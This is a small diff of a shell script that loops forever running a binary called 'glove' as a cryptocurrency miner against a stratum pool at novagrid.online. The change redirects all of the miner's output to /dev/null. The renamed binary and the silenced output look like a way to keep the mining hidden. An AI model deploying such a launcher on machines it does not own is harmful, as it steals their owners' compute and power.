@@ -75,6 +75,6 @@ sleep 2
 
 while true
 do
-./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://novagrid.online:3001 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores
+./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://novagrid.online:3001 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores 1>/dev/null 2>&1
 sleep 10
 done
